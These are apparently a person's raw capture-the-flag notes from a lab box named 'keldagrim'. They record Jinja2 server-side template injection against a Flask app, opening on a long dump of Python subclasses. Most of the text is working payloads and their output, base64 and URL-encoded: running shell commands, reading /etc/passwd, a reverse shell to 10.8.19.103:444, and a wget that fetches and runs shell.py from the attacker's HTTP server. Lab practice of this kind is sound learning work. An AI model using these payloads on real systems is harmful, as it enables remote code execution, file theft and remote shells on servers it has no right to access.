&#39;dis.Bytecode&#39;&gt;, &lt;class &#39;inspect.BlockFinder&#39;&gt;, &lt;class &#39;inspect._void&#39;&gt;, &lt;class &#39;inspect._empty&#39;&gt;, &lt;class &#39;inspect.Parameter&#39;&gt;, &lt;class &#39;inspect.BoundArguments&#39;&gt;, &lt;class &#39;inspect.Signature&#39;&gt;, &lt;class &#39;logging.LogRecord&#39;&gt;, &lt;class &#39;logging.PercentStyle&#39;&gt;, &lt;class &#39;logging.Formatter&#39;&gt;, &lt;class &#39;logging.BufferingFormatter&#39;&gt;, &lt;class &#39;logging.Filter&#39;&gt;, &lt;class &#39;logging.Filterer&#39;&gt;, &lt;class &#39;logging.PlaceHolder&#39;&gt;, &lt;class &#39;logging.Manager&#39;&gt;, &lt;class &#39;logging.LoggerAdapter&#39;&gt;, &lt;class &#39;werkzeug._internal._Missing&#39;&gt;, &lt;class &#39;werkzeug._internal._DictAccessorProperty&#39;&gt;, &lt;class &#39;pkgutil.ImpImporter&#39;&gt;, &lt;class &#39;pkgutil.ImpLoader&#39;&gt;, &lt;class &#39;werkzeug.utils.HTMLBuilder&#39;&gt;, &lt;class &#39;werkzeug.exceptions.Aborter&#39;&gt;, &lt;class &#39;werkzeug.urls.Href&#39;&gt;, &lt;class &#39;socketserver.BaseServer&#39;&gt;, &lt;class &#39;socketserver.ForkingMixIn&#39;&gt;, &lt;class &#39;socketserver.ThreadingMixIn&#39;&gt;, &lt;class &#39;socketserver.BaseRequestHandler&#39;&gt;, &lt;class &#39;calendar._localized_month&#39;&gt;, &lt;class &#39;calendar._localized_day&#39;&gt;, &lt;class &#39;calendar.Calendar&#39;&gt;, &lt;class &#39;calendar.different_locale&#39;&gt;, &lt;class &#39;email._parseaddr.AddrlistClass&#39;&gt;, &lt;class &#39;email.charset.Charset&#39;&gt;, &lt;class &#39;email.header.Header&#39;&gt;, &lt;class &#39;email.header._ValueFormatter&#39;&gt;, &lt;class &#39;email._policybase._PolicyBase&#39;&gt;, &lt;class &#39;email.feedparser.BufferedSubFile&#39;&gt;, &lt;class &#39;email.feedparser.FeedParser&#39;&gt;, &lt;class &#39;email.parser.Parser&#39;&gt;, &lt;class &#39;email.parser.BytesParser&#39;&gt;, &lt;class &#39;email.message.Message&#39;&gt;, &lt;class &#39;http.client.HTTPConnection&#39;&gt;, &lt;class &#39;ipaddress._IPAddressBase&#39;&gt;, &lt;class &#39;ipaddress._BaseV4&#39;&gt;, &lt;class &#39;ipaddress._IPv4Constants&#39;&gt;, &lt;class &#39;ipaddress._BaseV6&#39;&gt;, &lt;class &#39;ipaddress._IPv6Constants&#39;&gt;, &lt;class &#39;textwrap.TextWrapper&#39;&gt;, &lt;class &#39;_ssl._SSLContext&#39;&gt;, &lt;class &#39;_ssl._SSLSocket&#39;&gt;, &lt;class &#39;_ssl.MemoryBIO&#39;&gt;, &lt;class &#39;_ssl.Session&#39;&gt;, &lt;class &#39;ssl.SSLObject&#39;&gt;, &lt;class &#39;mimetypes.MimeTypes&#39;&gt;, &lt;class &#39;gettext.NullTranslations&#39;&gt;, &lt;class &#39;argparse._AttributeHolder&#39;&gt;, &lt;class &#39;argparse.HelpFormatter._Section&#39;&gt;, &lt;class &#39;argparse.HelpFormatter&#39;&gt;, &lt;class &#39;argparse.FileType&#39;&gt;, &lt;class &#39;argparse._ActionsContainer&#39;&gt;, &lt;class &#39;click._compat._FixupStream&#39;&gt;, &lt;class &#39;click._compat._AtomicFile&#39;&gt;, &lt;class &#39;click.utils.LazyFile&#39;&gt;, &lt;class &#39;click.utils.KeepOpenFile&#39;&gt;, &lt;class &#39;click.utils.PacifyFlushWrapper&#39;&gt;, &lt;class &#39;click.parser.Option&#39;&gt;, &lt;class &#39;click.parser.Argument&#39;&gt;, &lt;class &#39;click.parser.ParsingState&#39;&gt;, &lt;class &#39;click.parser.OptionParser&#39;&gt;, &lt;class &#39;click.types.ParamType&#39;&gt;, &lt;class &#39;click.formatting.HelpFormatter&#39;&gt;, &lt;class &#39;click.core.Context&#39;&gt;, &lt;class &#39;click.core.BaseCommand&#39;&gt;, &lt;class &#39;click.core.Parameter&#39;&gt;, &lt;class &#39;werkzeug.serving.WSGIRequestHandler&#39;&gt;, &lt;class &#39;werkzeug.serving._SSLContext&#39;&gt;, &lt;class &#39;werkzeug.serving.BaseWSGIServer&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableListMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.UpdateDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ViewItems&#39;&gt;, &lt;class &#39;werkzeug.datastructures._omd_bucket&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Headers&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableHeadersMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.IfRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Range&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ContentRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.FileStorage&#39;&gt;, &lt;class &#39;urllib.request.Request&#39;&gt;, &lt;class &#39;urllib.request.OpenerDirector&#39;&gt;, &lt;class &#39;urllib.request.BaseHandler&#39;&gt;, &lt;class &#39;urllib.request.HTTPPasswordMgr&#39;&gt;, &lt;class &#39;urllib.request.AbstractBasicAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.AbstractDigestAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.URLopener&#39;&gt;, &lt;class &#39;urllib.request.ftpwrapper&#39;&gt;, &lt;class &#39;werkzeug.wrappers.accept.AcceptMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.AuthorizationMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&#39;&gt;, &lt;class &#39;werkzeug.wsgi.ClosingIterator&#39;&gt;, &lt;class &#39;werkzeug.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;werkzeug.wsgi._RangeWrapper&#39;&gt;, &lt;class &#39;werkzeug.formparser.FormDataParser&#39;&gt;, &lt;class &#39;werkzeug.formparser.MultiPartParser&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_request.BaseRequest&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_response.BaseResponse&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.cors.CORSRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.cors.CORSResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgentParser&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgent&#39;&gt;, &lt;class &#39;werkzeug.wrappers.user_agent.UserAgentMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.request.StreamOnlyMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStream&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStreamMixin&#39;&gt;, &lt;class &#39;http.cookiejar.Cookie&#39;&gt;, &lt;class &#39;http.cookiejar.CookiePolicy&#39;&gt;, &lt;class &#39;http.cookiejar.Absent&#39;&gt;, &lt;class &#39;http.cookiejar.CookieJar&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieHeaders&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieResponse&#39;&gt;, &lt;class &#39;werkzeug.test.EnvironBuilder&#39;&gt;, &lt;class &#39;werkzeug.test.Client&#39;&gt;, &lt;class &#39;uuid.UUID&#39;&gt;, &lt;class &#39;CArgObject&#39;&gt;, &lt;class &#39;_ctypes.CThunkObject&#39;&gt;, &lt;class &#39;_ctypes._CData&#39;&gt;, &lt;class &#39;_ctypes.CField&#39;&gt;, &lt;class &#39;_ctypes.DictRemover&#39;&gt;, &lt;class &#39;ctypes.CDLL&#39;&gt;, &lt;class &#39;ctypes.LibraryLoader&#39;&gt;, &lt;class &#39;subprocess.CompletedProcess&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;, &lt;class &#39;itsdangerous._json._CompactJSON&#39;&gt;, &lt;class &#39;hmac.HMAC&#39;&gt;, &lt;class &#39;itsdangerous.signer.SigningAlgorithm&#39;&gt;, &lt;class &#39;itsdangerous.signer.Signer&#39;&gt;, &lt;class &#39;itsdangerous.serializer.Serializer&#39;&gt;, &lt;class &#39;itsdangerous.url_safe.URLSafeSerializerMixin&#39;&gt;, &lt;class &#39;flask._compat._DeprecatedBool&#39;&gt;, &lt;class &#39;werkzeug.local.Local&#39;&gt;, &lt;class &#39;werkzeug.local.LocalStack&#39;&gt;, &lt;class &#39;werkzeug.local.LocalManager&#39;&gt;, &lt;class &#39;werkzeug.local.LocalProxy&#39;&gt;, &lt;class &#39;difflib.SequenceMatcher&#39;&gt;, &lt;class &#39;difflib.Differ&#39;&gt;, &lt;class &#39;difflib.HtmlDiff&#39;&gt;, &lt;class &#39;pprint._safe_key&#39;&gt;, &lt;class &#39;pprint.PrettyPrinter&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleFactory&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleTemplate&#39;&gt;, &lt;class &#39;werkzeug.routing.BaseConverter&#39;&gt;, &lt;class &#39;werkzeug.routing.Map&#39;&gt;, &lt;class &#39;werkzeug.routing.MapAdapter&#39;&gt;, &lt;class &#39;blinker._saferef.BoundMethodWeakref&#39;&gt;, &lt;class &#39;blinker._utilities._symbol&#39;&gt;, &lt;class &#39;blinker._utilities.symbol&#39;&gt;, &lt;class &#39;blinker._utilities.lazy_property&#39;&gt;, &lt;class &#39;blinker.base.Signal&#39;&gt;, &lt;class &#39;flask.helpers.locked_cached_property&#39;&gt;, &lt;class &#39;flask.helpers._PackageBoundObject&#39;&gt;, &lt;class &#39;flask.cli.DispatchingApp&#39;&gt;, &lt;class &#39;flask.cli.ScriptInfo&#39;&gt;, &lt;class &#39;flask.config.ConfigAttribute&#39;&gt;, &lt;class &#39;flask.ctx._AppCtxGlobals&#39;&gt;, &lt;class &#39;flask.ctx.AppContext&#39;&gt;, &lt;class &#39;flask.ctx.RequestContext&#39;&gt;, &lt;class &#39;flask.json.tag.JSONTag&#39;&gt;, &lt;class &#39;flask.json.tag.TaggedJSONSerializer&#39;&gt;, &lt;class &#39;flask.sessions.SessionInterface&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json._JSONModule&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json.JSONMixin&#39;&gt;, &lt;class &#39;flask.blueprints.BlueprintSetupState&#39;&gt;, &lt;class &#39;unicodedata.UCD&#39;&gt;, &lt;class &#39;jinja2.ext.Extension&#39;&gt;, &lt;class &#39;jinja2.ext._CommentFinder&#39;&gt;] 

now inject {{''.__class__.__mro__[1].__subclasses__()[284:]}}

JTdCJTdCJycuX19jbGFzc19fLl9fbXJvX18lNUIxJTVELl9fc3ViY2xhc3Nlc19fKCklNUIyODQ6JTVEJTdEJTdE

or just without url encode

┌──(kali㉿kali)-[~/keldagrim]
└─$ echo -n "{{''.__class__.__mro__[1].__subclasses__()[284:]}}" | base64
e3snJy5fX2NsYXNzX18uX19tcm9fX1sxXS5fX3N1YmNsYXNzZXNfXygpWzI4NDpdfX0=


Current user - [&lt;class &#39;pkgutil.ImpImporter&#39;&gt;, &lt;class &#39;pkgutil.ImpLoader&#39;&gt;, &lt;class &#39;werkzeug.utils.HTMLBuilder&#39;&gt;, &lt;class &#39;werkzeug.exceptions.Aborter&#39;&gt;, &lt;class &#39;werkzeug.urls.Href&#39;&gt;, &lt;class &#39;socketserver.BaseServer&#39;&gt;, &lt;class &#39;socketserver.ForkingMixIn&#39;&gt;, &lt;class &#39;socketserver.ThreadingMixIn&#39;&gt;, &lt;class &#39;socketserver.BaseRequestHandler&#39;&gt;, &lt;class &#39;calendar._localized_month&#39;&gt;, &lt;class &#39;calendar._localized_day&#39;&gt;, &lt;class &#39;calendar.Calendar&#39;&gt;, &lt;class &#39;calendar.different_locale&#39;&gt;, &lt;class &#39;email._parseaddr.AddrlistClass&#39;&gt;, &lt;class &#39;email.charset.Charset&#39;&gt;, &lt;class &#39;email.header.Header&#39;&gt;, &lt;class &#39;email.header._ValueFormatter&#39;&gt;, &lt;class &#39;email._policybase._PolicyBase&#39;&gt;, &lt;class &#39;email.feedparser.BufferedSubFile&#39;&gt;, &lt;class &#39;email.feedparser.FeedParser&#39;&gt;, &lt;class &#39;email.parser.Parser&#39;&gt;, &lt;class &#39;email.parser.BytesParser&#39;&gt;, &lt;class &#39;email.message.Message&#39;&gt;, &lt;class &#39;http.client.HTTPConnection&#39;&gt;, &lt;class &#39;ipaddress._IPAddressBase&#39;&gt;, &lt;class &#39;ipaddress._BaseV4&#39;&gt;, &lt;class &#39;ipaddress._IPv4Constants&#39;&gt;, &lt;class &#39;ipaddress._BaseV6&#39;&gt;, &lt;class &#39;ipaddress._IPv6Constants&#39;&gt;, &lt;class &#39;textwrap.TextWrapper&#39;&gt;, &lt;class &#39;_ssl._SSLContext&#39;&gt;, &lt;class &#39;_ssl._SSLSocket&#39;&gt;, &lt;class &#39;_ssl.MemoryBIO&#39;&gt;, &lt;class &#39;_ssl.Session&#39;&gt;, &lt;class &#39;ssl.SSLObject&#39;&gt;, &lt;class &#39;mimetypes.MimeTypes&#39;&gt;, &lt;class &#39;gettext.NullTranslations&#39;&gt;, &lt;class &#39;argparse._AttributeHolder&#39;&gt;, &lt;class &#39;argparse.HelpFormatter._Section&#39;&gt;, &lt;class &#39;argparse.HelpFormatter&#39;&gt;, &lt;class &#39;argparse.FileType&#39;&gt;, &lt;class &#39;argparse._ActionsContainer&#39;&gt;, &lt;class &#39;click._compat._FixupStream&#39;&gt;, &lt;class &#39;click._compat._AtomicFile&#39;&gt;, &lt;class &#39;click.utils.LazyFile&#39;&gt;, &lt;class &#39;click.utils.KeepOpenFile&#39;&gt;, &lt;class &#39;click.utils.PacifyFlushWrapper&#39;&gt;, &lt;class &#39;click.parser.Option&#39;&gt;, &lt;class &#39;click.parser.Argument&#39;&gt;, &lt;class &#39;click.parser.ParsingState&#39;&gt;, &lt;class &#39;click.parser.OptionParser&#39;&gt;, &lt;class &#39;click.types.ParamType&#39;&gt;, &lt;class &#39;click.formatting.HelpFormatter&#39;&gt;, &lt;class &#39;click.core.Context&#39;&gt;, &lt;class &#39;click.core.BaseCommand&#39;&gt;, &lt;class &#39;click.core.Parameter&#39;&gt;, &lt;class &#39;werkzeug.serving.WSGIRequestHandler&#39;&gt;, &lt;class &#39;werkzeug.serving._SSLContext&#39;&gt;, &lt;class &#39;werkzeug.serving.BaseWSGIServer&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableListMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.UpdateDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ViewItems&#39;&gt;, &lt;class &#39;werkzeug.datastructures._omd_bucket&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Headers&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableHeadersMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.IfRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Range&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ContentRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.FileStorage&#39;&gt;, &lt;class &#39;urllib.request.Request&#39;&gt;, &lt;class &#39;urllib.request.OpenerDirector&#39;&gt;, &lt;class &#39;urllib.request.BaseHandler&#39;&gt;, &lt;class &#39;urllib.request.HTTPPasswordMgr&#39;&gt;, &lt;class &#39;urllib.request.AbstractBasicAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.AbstractDigestAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.URLopener&#39;&gt;, &lt;class &#39;urllib.request.ftpwrapper&#39;&gt;, &lt;class &#39;werkzeug.wrappers.accept.AcceptMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.AuthorizationMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&#39;&gt;, &lt;class &#39;werkzeug.wsgi.ClosingIterator&#39;&gt;, &lt;class &#39;werkzeug.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;werkzeug.wsgi._RangeWrapper&#39;&gt;, &lt;class &#39;werkzeug.formparser.FormDataParser&#39;&gt;, &lt;class &#39;werkzeug.formparser.MultiPartParser&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_request.BaseRequest&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base_response.BaseResponse&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.cors.CORSRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.cors.CORSResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgentParser&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgent&#39;&gt;, &lt;class &#39;werkzeug.wrappers.user_agent.UserAgentMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.request.StreamOnlyMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStream&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStreamMixin&#39;&gt;, &lt;class &#39;http.cookiejar.Cookie&#39;&gt;, &lt;class &#39;http.cookiejar.CookiePolicy&#39;&gt;, &lt;class &#39;http.cookiejar.Absent&#39;&gt;, &lt;class &#39;http.cookiejar.CookieJar&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieHeaders&#39;&gt;, &lt;class &#39;werkzeug.test._TestCookieResponse&#39;&gt;, &lt;class &#39;werkzeug.test.EnvironBuilder&#39;&gt;, &lt;class &#39;werkzeug.test.Client&#39;&gt;, &lt;class &#39;uuid.UUID&#39;&gt;, &lt;class &#39;CArgObject&#39;&gt;, &lt;class &#39;_ctypes.CThunkObject&#39;&gt;, &lt;class &#39;_ctypes._CData&#39;&gt;, &lt;class &#39;_ctypes.CField&#39;&gt;, &lt;class &#39;_ctypes.DictRemover&#39;&gt;, &lt;class &#39;ctypes.CDLL&#39;&gt;, &lt;class &#39;ctypes.LibraryLoader&#39;&gt;, &lt;class &#39;subprocess.CompletedProcess&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;, &lt;class &#39;itsdangerous._json._CompactJSON&#39;&gt;, &lt;class &#39;hmac.HMAC&#39;&gt;, &lt;class &#39;itsdangerous.signer.SigningAlgorithm&#39;&gt;, &lt;class &#39;itsdangerous.signer.Signer&#39;&gt;, &lt;class &#39;itsdangerous.serializer.Serializer&#39;&gt;, &lt;class &#39;itsdangerous.url_safe.URLSafeSerializerMixin&#39;&gt;, &lt;class &#39;flask._compat._DeprecatedBool&#39;&gt;, &lt;class &#39;werkzeug.local.Local&#39;&gt;, &lt;class &#39;werkzeug.local.LocalStack&#39;&gt;, &lt;class &#39;werkzeug.local.LocalManager&#39;&gt;, &lt;class &#39;werkzeug.local.LocalProxy&#39;&gt;, &lt;class &#39;difflib.SequenceMatcher&#39;&gt;, &lt;class &#39;difflib.Differ&#39;&gt;, &lt;class &#39;difflib.HtmlDiff&#39;&gt;, &lt;class &#39;pprint._safe_key&#39;&gt;, &lt;class &#39;pprint.PrettyPrinter&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleFactory&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleTemplate&#39;&gt;, &lt;class &#39;werkzeug.routing.BaseConverter&#39;&gt;, &lt;class &#39;werkzeug.routing.Map&#39;&gt;, &lt;class &#39;werkzeug.routing.MapAdapter&#39;&gt;, &lt;class &#39;blinker._saferef.BoundMethodWeakref&#39;&gt;, &lt;class &#39;blinker._utilities._symbol&#39;&gt;, &lt;class &#39;blinker._utilities.symbol&#39;&gt;, &lt;class &#39;blinker._utilities.lazy_property&#39;&gt;, &lt;class &#39;blinker.base.Signal&#39;&gt;, &lt;class &#39;flask.helpers.locked_cached_property&#39;&gt;, &lt;class &#39;flask.helpers._PackageBoundObject&#39;&gt;, &lt;class &#39;flask.cli.DispatchingApp&#39;&gt;, &lt;class &#39;flask.cli.ScriptInfo&#39;&gt;, &lt;class &#39;flask.config.ConfigAttribute&#39;&gt;, &lt;class &#39;flask.ctx._AppCtxGlobals&#39;&gt;, &lt;class &#39;flask.ctx.AppContext&#39;&gt;, &lt;class &#39;flask.ctx.RequestContext&#39;&gt;, &lt;class &#39;flask.json.tag.JSONTag&#39;&gt;, &lt;class &#39;flask.json.tag.TaggedJSONSerializer&#39;&gt;, &lt;class &#39;flask.sessions.SessionInterface&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json._JSONModule&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json.JSONMixin&#39;&gt;, &lt;class &#39;flask.blueprints.BlueprintSetupState&#39;&gt;, &lt;class &#39;unicodedata.UCD&#39;&gt;, &lt;class &#39;jinja2.ext.Extension&#39;&gt;, &lt;class &#39;jinja2.ext._CommentFinder&#39;&gt;] 

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

                                                                               
┌──(kali㉿kali)-[~/Downloads]
└─$ echo -n "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}" | base64
e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdscycp
LnJlYWQoKX19

Current user - app user.txt 

e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvcyddLnBvcGVuKCdscycpLnJlYWQoKX19

{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

JTdCJTdCJTIwZ2V0X2ZsYXNoZWRfbWVzc2FnZXMuX19nbG9iYWxzX18uX19idWlsdGluc19fLm9wZW4oJTIyL2V0Yy9wYXNzd2QlMjIpLnJlYWQoKSUyMCU3RCU3RA==

Current user - root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin jed:x:1000:1000:jed:/home/jed:/bin/bash 



RCE

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2

┌──(kali㉿kali)-[~/keldagrim]
└─$ echo -n "{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.19.103\",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"];'").read().zfill(417)}}{%endif%}{% endfor %}" | base64 

eyUgZm9yIHggaW4gKCkuX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBp
ZiB3YXJuaW5nIGluIHguX19uYW1lX18gJX17e3goKS5fbW9kdWxlLl9fYnVpbHRpbnNfX1snX19p
bXBvcnRfXyddKCdvcycpLnBvcGVuKHB5dGhvbjMgLWMgaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNz
LG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3Mu
Y29ubmVjdCgoXCIxMC44LjE5LjEwM1wiLDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3Mu
ZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNh
bGwoW1wiL2Jpbi9iYXNoXCJdOykucmVhZCgpLnpmaWxsKDQxNyl9fXslZW5kaWYlfXslIGVuZGZv
ciAlfQ==

give internal 500 error

uploading a revshell

┌──(kali㉿kali)-[~/keldagrim]
└─$ cat shell.py 
import pty;
RHOST=10.8.19.103
RPORT=444
import sys
import socket
import os
import pty
s=socket.socket()
s.connect((RHOST,RPORT))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")

┌──(kali㉿kali)-[~/keldagrim]
└─$ echo -n "{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[401](["wget", "http://10.8.19.103:8000/shell.py"], stdout=-1, stderr=-1).communicate()}}" | base64
e3tnZXRfZmxhc2hlZF9tZXNzYWdlcy5fX2NsYXNzX18uX19tcm9fX1sxXS5fX3N1YmNsYXNzZXNf
XygpWzQwMV0oW3dnZXQsIGh0dHA6Ly8xMC44LjE5LjEwMzo4MDAwL3NoZWxsLnB5XSwgc3Rkb3V0
PS0xLCBzdGRlcnI9LTEpLmNvbW11bmljYXRlKCl9fQ==

not works so just encoded with cyberchef url encode
and will be

JTdCJTdCZ2V0X2ZsYXNoZWRfbWVzc2FnZXMuX19jbGFzc19fLl9fbXJvX18lNUIxJTVELl9fc3ViY2xhc3Nlc19fKCklNUI0MDElNUQoJTVCJTIyd2dldCUyMiwlMjAlMjJodHRwOi8vMTAuOC4xOS4xMDM6ODAwMC9zaGVsbC5weSUyMiU1RCwlMjBzdGRvdXQ9LTEsJTIwc3RkZXJyPS0xKS5jb21tdW5pY2F0ZSgpJTdEJTdE

Current user - (b&#39;&#39;, b&#39;--2022-11-23 00:30:56-- http://10.8.19.103:8000/shell.py\nConnecting to 10.8.19.103:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 185 [text/x-python]\nSaving to: \xe2\x80\x98shell.py\xe2\x80\x99\n\n 0K 100% 45.0K=0.004s\n\n2022-11-23 00:30:56 (45.0 KB/s) - \xe2\x80\x98shell.py\xe2\x80\x99 saved [185/185]\n\n&#39;) 

┌──(kali㉿kali)-[~/keldagrim]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.197.217 - - [22/Nov/2022 19:30:57] "GET /shell.py HTTP/1.1" 200 -

so it works now execute the shell

{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[401](["python3", "./shell.py"], stdout=-1, stderr=-1).communicate()}}

JTdCJTdCZ2V0X2ZsYXNoZWRfbWVzc2FnZXMuX19jbGFzc19fLl9fbXJvX18lNUIxJTVELl9fc3ViY2xhc3Nlc19fKCklNUI0MDElNUQoJTVCJTIycHl0aG9uMyUyMiwlMjAlMjIuL3NoZWxsLnB5JTIyJTVELCUyMHN0ZG91dD0tMSwlMjBzdGRlcnI9LTEpLmNvbW11bmljYXRlKCklN0QlN0Q=

Current user - (b&#39;&#39;, b&#39;Traceback (most recent call last):\n File &#34;./shell.py&#34;, line 9, in &lt;module&gt;\n s.connect((RHOST,RPORT))\nConnectionRefusedError: [Errno 111] Connection refused\n&#39;) 

uhmm

let's list
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

JTdCJTdCY29uZmlnLl9fY2xhc3NfXy5fX2luaXRfXy5fX2dsb2JhbHNfXyU1QidvcyclNUQucG9wZW4oJ2xzJykucmVhZCgpJTdEJTdE

Current user - app shell.py shell.py.1 shell.py.2 shell.py.3 shell.py.4 user.txt 

{{config.__class__.__init__.__globals__['os'].popen('cat user.txt').read()}}

JTdCJTdCY29uZmlnLl9fY2xhc3NfXy5fX2luaXRfXy5fX2dsb2JhbHNfXyU1QidvcyclNUQucG9wZW4oJ2NhdCUyMHVzZXIudHh0JykucmVhZCgpJTdEJTdE

flag user
